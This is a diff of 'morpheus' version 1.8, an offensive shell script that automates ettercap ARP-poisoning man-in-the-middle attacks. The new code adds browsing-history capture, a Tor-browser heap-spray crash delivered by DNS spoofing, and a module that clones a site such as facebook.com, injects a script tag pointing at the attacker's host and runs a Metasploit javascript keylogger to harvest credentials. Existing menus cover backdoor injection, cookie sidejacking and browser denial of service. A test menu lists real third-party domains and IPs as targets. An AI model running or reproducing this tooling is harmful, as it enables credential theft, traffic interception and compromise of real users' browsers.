@@ -1,7 +1,7 @@
 #!/bin/sh
 ###
 # morpheus - automated ettercap TCP/IP Hijacking tool
-# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.7
+# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.8
 # Suspicious-Shell-Activity (SSA) RedTeam develop @2016
 # codename: blue_dreams [ GPL licensed ]
 ###
@@ -9,7 +9,7 @@
 ###
 # Resize terminal windows size befor running the tool (gnome terminal)
 # Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
-resize -s 35 85 > /dev/null
+resize -s 37 85 > /dev/null
 # inicio
 
 
@@ -127,7 +127,7 @@ done
 # Variable declarations
 # ---------------------
 dtr=`date | awk '{print $4}'`        # grab current hour
-V3R="1.7"                            # module version number
+V3R="1.8"                            # module version number
 cnm="blue_dream"                       # module codename
 DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
 IPATH=`pwd`                          # grab morpheus.sh install path
@@ -672,11 +672,86 @@ fi
 
 
 
+# -----------------------------------------------
+# CAPTURE TARGET BROWSING HISTORY [URL's VISITED]
+# -----------------------------------------------
+sh_stage6 () {
+echo ""
+echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo "${BlueF}    | ${YellowF}  This module will capture target browsing surfing [url visited]  ${BlueF}|"
+echo "${BlueF}    | ${YellowF}  and display then with the help of urlsnarf, this module will    ${BlueF}|"
+echo "${BlueF}    | ${YellowF}    also store urls visited into morpheus/logs/grab_hosts.log     ${BlueF}|"
+echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo ""
+sleep 2
+# run module?
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+
+# get user input to build filter
+rm $IPATH/logs/grab_hosts.log > /dev/null 2>&1
+echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
+
+
+  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+  sleep 1
+  # backup all files needed.
+  cd $IPATH/bin
+  cp $IPATH/filters/grab_hosts.eft $IPATH/filters/grab_hosts.rb > /dev/null 2>&1 # backup
+  # use SED bash command
+  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/grab_hosts.eft > /dev/null 2>&1
+  cd $IPATH
+  sleep 1
+
+  # compiling UserAgent.eft to be used in ettercap
+  echo ${BlueF}[☠]${white} Compiling grab_hosts.eft${RedF}!${Reset};
+  xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/grab_hosts.eft -o $IPATH/output/grab_hosts.ef && sleep 3"
+  sleep 1
+
+      # run mitm+filter
+      cd $IPATH/logs
+      echo ${BlueF}[☠]${white} Please wait, Capturing ${YellowF}HTTP${white} traffic${RedF}!${Reset};
+      sleep 2
+      if [ "$IpV" = "ACTIVE" ]; then
+      echo ${RedF}  # webspy -i $InT3R $UpL
+        urlsnarf -i $InT3R | cut -d\" -f4 & xterm -T "MORPHEUS - browsing capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/grab_hosts.ef -M ARP /$rhost// /$gateway//"
+      else
+      echo ${RedF}
+        urlsnarf -i $InT3R | cut -d\" -f4 & xterm -T "MORPHEUS - browsing capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/grab_hosts.ef -M ARP /$rhost/ /$gateway/"
+      fi
+
+  # display captured brosing hitory to user
+  HoSt=`cat $IPATH/logs/grab_hosts.log | grep "Host:"` > /dev/null 2>&1
+  echo ""
+  echo "${BlueF}[☠]${white} host:${YellowF}$UpL ${white}browsing history stored${RedF}!"
+  echo "${BlueF}[☠]${white} Please check: morpheus/logs/grab_hosts.log${RedF}!"
+  sleep 3
+
+
+  # clean up
+  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  mv $IPATH/filters/grab_hosts.rb $IPATH/filters/grab_hosts.eft > /dev/null 2>&1 # backup
+  rm $IPATH/output/grab_hosts.ef > /dev/null 2>&1
+  cd $IPATH
+  sleep 2
+
+else
+  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  sleep 2
+fi
+}
+
+
+
+
 
 # --------------------------------------------------------
 # CLONE WEBSITE AND INJECT BACKDOOR ON </BODY><IFRAME> TAG
 # --------------------------------------------------------
-sh_stage6 () {
+sh_stage7 () {
 echo ""
 echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
 echo "${BlueF}    | ${YellowF}    This module will embbeded your payload into a fake webpage    ${BlueF}|"
@@ -749,7 +824,7 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
         ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
         else
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/packet_drop -M ARP /$rhost// /$gateway//
+        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/clone_creds -M ARP /$rhost// /$gateway//
         fi
 
       else
@@ -759,7 +834,7 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
         ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
         else
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/packet_drop -M ARP /$rhost/ /$gateway/
+        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/clone_creds -M ARP /$rhost/ /$gateway/
         fi
       fi
 
@@ -789,7 +864,7 @@ fi
 # ----------------------------------------------------
 # FIREFOX =< 49.0.1 DENIAL-OF-SERVICE [mitm+dns_spoof]
 # ----------------------------------------------------
-sh_stage7 () {
+sh_stage8 () {
 echo ""
 echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
 echo "${BlueF}    | ${YellowF} This module will crash target mozilla firefox (=< 49.0.1) using  ${BlueF}|"
@@ -885,7 +960,7 @@ fi
         ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
         else
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/UserAgent -M ARP /$rhost// /$gateway//
+        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/Firefox_buffer -M ARP /$rhost// /$gateway//
         fi
 
       else
@@ -895,7 +970,7 @@ fi
         ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
         else
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/UserAgent -M ARP /$rhost/ /$gateway/
+        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/Firefox_buffer -M ARP /$rhost/ /$gateway/
         fi
       fi
 
@@ -928,7 +1003,7 @@ fi
 # --------------------------------------------------
 # ANDROID BROWSER DENIAL-OF-SERVICE [mitm+dns_spoof]
 # --------------------------------------------------
-sh_stage8 () {
+sh_stage9 () {
 echo ""
 echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
 echo "${BlueF}    | ${YellowF}    This module will crash target android browsers by using a     ${BlueF}|"
@@ -1026,7 +1101,7 @@ fi
         ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
         else
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/UserAgent -M ARP /$rhost// /$gateway//
+        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/Firefox_buffer -M ARP /$rhost// /$gateway//
         fi
 
       else
@@ -1036,7 +1111,7 @@ fi
         ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
         else
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/UserAgent -M ARP /$rhost/ /$gateway/
+        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/Firefox_buffer -M ARP /$rhost/ /$gateway/
         fi
       fi
 
@@ -1065,15 +1140,18 @@ fi
 
 
 
-# -----------------------------------------------
-# CAPTURE TARGET BROWSING HISTORY [URL's VISITED]
-# -----------------------------------------------
-sh_stage9 () {
+# -----------------------------------------------------
+# TOR-BROWSER BUFFER OVERFLOW EXPLOIT [windows systems]
+# -----------------------------------------------------
+sh_stage10 () {
 echo ""
 echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    | ${YellowF}  This module will capture target browsing surfing [url visited]  ${BlueF}|"
-echo "${BlueF}    | ${YellowF}  and display then with the help of urlsnarf, this module will    ${BlueF}|"
-echo "${BlueF}    | ${YellowF}    also store urls visited into morpheus/logs/grab_hosts.log     ${BlueF}|"
+echo "${BlueF}    | ${YellowF} This module will crash target tor-browser (windows sys) using a  ${BlueF}|"
+echo "${BlueF}    | ${YellowF} Heap Spray writen in javascript (deliver under mitm + dns_spoof) ${BlueF}|"
+echo "${BlueF}    | ${YellowF}  'All [.com] domains will be redirected to the exploit webpage'  ${BlueF}|"
+echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
+echo "${BlueF}    | ${YellowF}  1 - Capture a tcp/udp packet from target host to verify vuln    ${BlueF}|"
+echo "${BlueF}    | ${YellowF}  2 - If tor version its exploitable then deliver payload.        ${BlueF}|"
 echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
 echo ""
 sleep 2
@@ -1082,7 +1160,7 @@ rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Exec
 if [ "$?" -eq "0" ]; then
 
 # get user input to build filter
-rm $IPATH/logs/grab_hosts.log > /dev/null 2>&1
+rm $IPATH/logs/UserAgent.log > /dev/null 2>&1
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
@@ -1093,42 +1171,103 @@ UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target
   sleep 1
   # backup all files needed.
   cd $IPATH/bin
-  cp $IPATH/filters/grab_hosts.eft $IPATH/filters/grab_hosts.rb > /dev/null 2>&1 # backup
+  cp $IPATH/bin/etter.dns etter.rb # backup (NO dev/null to report file not existence)
+  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
+  cp $IPATH/filters/UserAgent.eft $IPATH/filters/UserAgent.rb > /dev/null 2>&1 # backup
+  # copy files to apache2 webroot
+  cp $IPATH/bin/phishing/tor_0day/cssbanner.js $ApachE/cssbanner.js > /dev/null 2>&1
+  cp $IPATH/bin/phishing/tor_0day/Tor-Exploit.html $ApachE/index.html > /dev/null 2>&1
   # use SED bash command
-  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/grab_hosts.eft > /dev/null 2>&1
+  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/UserAgent.eft > /dev/null 2>&1
+  sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
+  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
+  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
   cd $IPATH
   sleep 1
 
   # compiling UserAgent.eft to be used in ettercap
-  echo ${BlueF}[☠]${white} Compiling grab_hosts.eft${RedF}!${Reset};
-  xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/grab_hosts.eft -o $IPATH/output/grab_hosts.ef && sleep 3"
+  echo ${BlueF}[☠]${white} Compiling UserAgent.eft${RedF}!${Reset};
+  xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/UserAgent.eft -o $IPATH/output/UserAgent.ef && sleep 3"
   sleep 1
+
+# start apache2 webserver...
+echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
+/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
 
       # run mitm+filter
       cd $IPATH/logs
-      echo ${BlueF}[☠]${white} Please wait, Capturing ${YellowF}HTTP${white} traffic${RedF}!${Reset};
+      echo ${BlueF}[☠]${white} Please wait, For User-Agent Capture${RedF}!${Reset}; 
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
-      echo ${RedF}  # webspy -i $InT3R $UpL
-        urlsnarf -i $InT3R | cut -d\" -f4 & xterm -T "MORPHEUS - browsing capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/grab_hosts.ef -M ARP /$rhost// /$gateway//"
+        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost// /$gateway// && sleep 3"
       else
-      echo ${RedF}
-        urlsnarf -i $InT3R | cut -d\" -f4 & xterm -T "MORPHEUS - browsing capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/grab_hosts.ef -M ARP /$rhost/ /$gateway/"
+        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost/ /$gateway/ && sleep 3"
       fi
 
-  # display captured brosing hitory to user
-  HoSt=`cat $IPATH/logs/grab_hosts.log | grep "Host:"` > /dev/null 2>&1
-  echo ""
-  echo "${BlueF}[☠]${white} host:${YellowF}$UpL ${white}browsing history stored${RedF}!"
-  echo "${BlueF}[☠]${white} Please check: morpheus/logs/grab_hosts.log${RedF}!"
-  sleep 3
+  # check if target system its vuln
+  # User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+  nOn="Windows" # only windows systems are affected...
+  HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print $2,$3'}` > /dev/null 2>&1
+  AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print $2,$3'}` > /dev/null 2>&1
+  VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print $3'} | cut -d '(' -f2` > /dev/null 2>&1
+  DisP=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print $2,$3,$4,$5,$6,$7'}` > /dev/null 2>&1
+  echo "${GreenF}    Host: $HoSt"
+  sleep 1
+  echo "${GreenF}    Accept-Language: $AcLa"
+  sleep 1
+  echo "${GreenF}    User-Agent: $DisP"
+  sleep 1
+
+
+if [ $VeVul \> $nOn ]; then
+echo "${GreenF}    System report:${RedF} not vulnerable...${BlueF}"
+sleep 3
+echo "${RedF}[x]${white} module cant verify system distro ${RedF}(${YellowF}running blind${RedF})!"
+sleep 1
+else
+echo "${GreenF}    System report: vulnerable...${BlueF}"
+sleep 3
+fi
+
+      # run mitm+filter
+      cd $IPATH/logs
+      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
+      sleep 2
+      if [ "$IpV" = "ACTIVE" ]; then
+        if [ "$LoGs" = "NO" ]; then
+        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
+        else
+        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/tor_buffer -M ARP /$rhost// /$gateway//
+        fi
+
+      else
+
+        if [ "$LoGs" = "YES" ]; then
+        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
+        else
+        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/tor_buffer -M ARP /$rhost/ /$gateway/
+        fi
+      fi
+
 
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-  mv $IPATH/filters/grab_hosts.rb $IPATH/filters/grab_hosts.eft > /dev/null 2>&1 # backup
-  rm $IPATH/output/grab_hosts.ef > /dev/null 2>&1
+/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
+  mv /tmp/etter.dns $Edns > /dev/null 2>&1
+  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
+  mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft > /dev/null 2>&1 # backup
+  rm $IPATH/output/UserAgent.ef > /dev/null 2>&1
+  rm $ApachE/index.html > /dev/null 2>&1
+  rm $ApachE/cssbanner.js > /dev/null 2>&1
   cd $IPATH
+  # port-forward
+  # echo "0" > /proc/sys/net/ipv4/ip_forward
   sleep 2
 
 else
@@ -1142,10 +1281,124 @@ fi
 
 
 
+# ---------------------------------------------------------------
+# INJECT A JAVA KEYLOOGER INTO TARGET WEBPAGE
+# clone a website and inject a metasploit iframe (java_keylogger)
+# ---------------------------------------------------------------
+sh_stage11 () {
+echo ""
+echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo "${BlueF}    | ${YellowF} This module will allow you to clone a webpage at your choise and ${BlueF}|"
+echo "${BlueF}    | ${YellowF} inject a java keylooger on it, then uses mitm + dns_spoof to be  ${BlueF}|"
+echo "${BlueF}    | ${YellowF} abble to redirect target traffic to the cloned webpage were the  ${BlueF}|"
+echo "${BlueF}    | ${YellowF} java keylooger (metasploit required) waits for input credentials.${BlueF}|"
+echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
+echo "${BlueF}    | ${YellowF} WARNING:'msfconsole required to capture credentials from target' ${BlueF}|"
+echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo ""
+sleep 2
+# run module?
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+
+
+echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+cLon=$(zenity --title="☠ WEBPAGE TO CLONE ☠" --text "example: www.facebook.com\nchose domain name to be cloned." --entry --width 270) > /dev/null 2>&1
+
+
+  # dowloading/clonning website target
+  cd $IPATH/output && mkdir clone && cd clone
+  echo ${BlueF}[☠]${white} Please wait, clonning webpage${RedF}!${Reset};
+  sleep 1 && mkdir $cLon && cd $cLon
+  # download -nd (no-directory) -nv (low verbose) -Q (download quota) -A (file type) -m (mirror)
+  wget -qq -U Mozilla -m -nd -nv -Q 900000 -A.html,.jpg,.png,.ico,.php,.js $cLon | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="Cloning webpage: $cLon" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+  # inject the javascript <TAG> in cloned index.html using SED command
+  echo ${BlueF}[☠]${white} Inject javascript Into cloned webpage${RedF}!${Reset};
+  sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > copy.html
+  mv copy.html index.html > /dev/null 2>&1
+  # copy all files to apache2 webroot
+  echo ${BlueF}[☠]${white} Copy files to apache2 webroot${RedF}!${Reset};
+  sleep 2
+  cp index.html $ApachE/index.html # NO dev/null to report file not existence
+  cd ..
+  cp -r $cLon $ApachE/$cLon > /dev/null 2>&1
+  cd $IPATH
+
+
+    # backup all files needed.
+    echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+    cd $IPATH/bin
+    cp $IPATH/bin/etter.dns $IPATH/bin/etter.rb # backup (NO dev/null to report file not existence)
+    cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
+    # use SED bash command
+    sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
+    cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
+    echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
+    cd $IPATH
+    sleep 1
+
+
+
+    # start metasploit services
+    echo ${BlueF}[☠]${white} Start metasploit services...${Reset};
+    service postgresql start > /dev/null 2>&1
+    msfdb delete > /dev/null 2>&1
+    msfdb init > /dev/null 2>&1
+
+# start apache2 webserver...
+echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
+/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
+
+      # run mitm+filter
+      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
+      sleep 2
+      if [ "$IpV" = "ACTIVE" ]; then
+        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        xterm -T "MSFCONSOLE" -geometry 110x23 -e "sudo msfconsole -x 'use auxiliary/server/capture/http_javascript_keylogger; set DEMO 0; set LHOST $IP; set URIPATH support; exploit'" & ettercap -T -Q -i $InT3R -P dns_spoof -M arp /$rhost// /$gateway//
+      else
+        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        xterm -T "MORPHEUS TCP/IP HIJACKING" -geometry 110x23 -e "sudo msfconsole -x 'use auxiliary/server/capture/http_javascript_keylogger; set DEMO 0; set LHOST $IP; set URIPATH support; exploit'" & ettercap -T -Q -i $InT3R -P dns_spoof -M arp /$rhost/ /$gateway/
+      fi
+
+
+  # clean up
+  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  mv /root/.msf4/loot/*.txt $IPATH/logs > /dev/null 2>&1
+  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
+  mv /tmp/etter.dns $Edns > /dev/null 2>&1
+  rm -r $ApachE/$cLon > /dev/null 2>&1
+  rm -r $IPATH/output/clone > /dev/null 2>&1
+  cd $IPATH
+
+# start apache2 webserver...
+echo ${BlueF}[☠]${white} Stop apache2 webserver...${Reset};
+/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
+service postgresql stop > /dev/null 2>&1
+echo ${BlueF}[☠]${white} Check your logs folder${RedF}!${Reset};
+sleep 2
+
+
+
+
+else
+  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  sleep 2
+fi
+}
+
+
+
+
+
+
+
 # --------------------------------
 # INJECT IMAGE INTO TARGET WEBSITE
 # --------------------------------
-sh_stage10 () {
+sh_stage12 () {
 echo ""
 echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
 echo "${BlueF}    | ${YellowF}    This filter will substitute the html tag '<img src=>'         ${BlueF}|"
@@ -1354,18 +1607,19 @@ fi
 sh_stageT () {
 echo ""
 echo "${white}    Available targets For testing [HTTP] "
-echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    |  ${YellowF}http://eventolinux.org${BlueF}                                           |"
-echo "${BlueF}    |  ${YellowF}http://predragtasevski.com${BlueF}                                       |"
-echo "${BlueF}    |  ${YellowF}http://www.portugalpesca.com${BlueF}                                     |"
-echo "${BlueF}    |  ${YellowF}http://178.21.117.152/phpmyadmin/${BlueF}                                |"
-echo "${BlueF}    |  ${YellowF}http://malwareforensics1.blogspot.pt${BlueF}                             |"
-echo "${BlueF}    |  ${YellowF}http://www.portugalpesca.com/forum/login.php${BlueF}                     |"
-echo "${BlueF}    |  ${YellowF}telnet 216.58.214.174 [TELNET]${BlueF}                                   |"
-echo "${BlueF}    |  ${YellowF}telnet 192.168.1.254  [TELNET]${BlueF}                                   |"
-echo "${BlueF}    |  ${YellowF}ftp 192.168.1.254     [FTP]${BlueF}                                      |"
-echo "${BlueF}    |  ${YellowF}ssh 192.168.1.254     [SSH]${BlueF}                                      |"
-echo "${BlueF}    ╠───────────────────────────────────────────────────────────────────╝"
+echo "${BlueF}    ╔─────────────────────────────────────────────────────────────────────╗"
+echo "${BlueF}    |  ${YellowF}http://eventolinux.org                       [User-Agent capture]${BlueF}  |"
+echo "${BlueF}    |  ${YellowF}http://predragtasevski.com                   [User-Agent capture]${BlueF}  |"
+echo "${BlueF}    |  ${YellowF}http://www.portugalpesca.com                 [User-Agent capture]${BlueF}  |"
+echo "${BlueF}    |  ${YellowF}http://178.21.117.152/phpmyadmin/            [http_creds]${BlueF}          |"
+echo "${BlueF}    |  ${YellowF}http://malwareforensics1.blogspot.pt         [User-Agent capture]${BlueF}  |"
+echo "${BlueF}    |  ${YellowF}http://www.portugalpesca.com/forum/login.php [auth_cookie|http]${BlueF}    |"
+echo "${BlueF}    |  ${YellowF}telnet 216.58.214.174                        [telnet_creds]${BlueF}        |"
+echo "${BlueF}    |  ${YellowF}telnet 192.168.1.254                         [telnet_creds]${BlueF}        |"
+echo "${BlueF}    |  ${YellowF}ftp 192.168.1.254                            [ftp_creds]${BlueF}           |"
+echo "${BlueF}    |  ${YellowF}ssh 192.168.1.254                            [ssh_creds]${BlueF}           |"
+echo "${BlueF}    |  ${YellowF}ping -c 2 www.househot.com                   [mocbotIRC detection]${BlueF} |"
+echo "${BlueF}    ╠─────────────────────────────────────────────────────────────────────╝"
 sleep 1
 echo "${BlueF}    ╘ ${white}Press [${GreenF}ENTER${white}] to 'return' to main menu${RedF}!"
 read OP
@@ -1433,32 +1687,34 @@ cat << !
 echo ${BlueF}"    VERSION:${YellowF}$V3R${BlueF} DISTRO:${YellowF}$DiStR0${BlueF} IP:${YellowF}$IP${BlueF} INTERFACE:${YellowF}$InT3R${BlueF} IPv6:${YellowF}$IpV"${BlueF}
 cat << !
     ╔────────╦──────────────────────────────────────────────────────────╗
-    | OPTION |                 DESCRIPTION(filters)                     |
+    | OPTION |                  DESCRIPTION(filters)                    |
     ╠────────╩──────────────────────────────────────────────────────────╣
-    |   1    -  Firewall filter (tcp/udp)        [report/capture_creds] |
-    |   2    -  Sidejacking cookie (http)        [capture auth cookies] |
-    |   3    -  Drop all packets (src/dst)       [ packets drop,kill  ] |
-    |   4    -  Redirect browser traffic         [ to another domain  ] |
-    |   5    -  Redirect browser traffic         [ to google sphere   ] |
-    |   6    -  Inject backdoor into </body>     [ meterpreter.exe    ] |
-    |   7    -  Firefox denial-of-service        [ firefox =< 49.0.1  ] |
-    |   8    -  Android denial-of-service        [ android browsers   ] |
-    |   9    -  Capture browser traffic          [ visited url's      ] |
-    |  10    -  Replace website images           [ img src=http://www ] |
-    |  11    -  Replace website text             [ replace: worlds    ] |
-    |  12    -  Rotate website document 180º     [ CSS3 injection     ] |
-    |  13    -  https downgrade attack (demo)    [ replace: https     ] |
-    |  14    -  ssh downgrade attack (demo)      [ replace: SSH-1.99  ] |
+    |   1    -  Firewall filter  (tcp/udp)      -  report/capture_creds |
+    |   2    -  Capture cookies  (http/auth)    -  sidejacking attack   |
+    |   3    -  Drop all packets (src/dst)      -  packets drop/kill    |
+    |   4    -  Redirect browser traffic        -  to another domain    |
+    |   5    -  Redirect browser traffic        -  to google sphere     |
+    |   6    -  Capture  browser traffic (http) -  visited url's        |
+    |   7    -  Inject backdoor into (</body>)  -  exe,bat,jar,ps1,dll  |
+    |   8    -  Firefox denial-of-service       -  buffer overflow      |
+    |   9    -  Android denial-of-service       -  buffer overflow      |
+    |  10    -  Tor-browser d0s (windows)       -  buffer overflow      |
+    |  11    -  Clone website + keylooger       -  javascritp_keylooger |
+    |  12    -  Replace website images          -  img src=http://other |
+    |  13    -  Replace website text            -  replace: worlds      |
+    |  14    -  Rotate website document 180º    -  CSS3 injection       |
+    |  15    -  https downgrade attack (demo)   -  replace: https       |
+    |  16    -  ssh   downgrade attack (demo)   -  replace: SSH-1.99    |
     |                                                                   |
-    |   W    -  Write your own filter            [ use morpheus tool  ] |
-    |   S    -  Scan LAN for live hosts          [ use nmap framework ] |
-    |   E    -  Exit/close Morpheus              [ safelly close tasks] |
+    |   W    -  Write your own filter                                   |
+    |   S    -  Scan LAN for live hosts                                 |
+    |   E    -  Exit/close Morpheus                                     |
     ╚───────────────────────────────────────────────────────────────────╣
 !
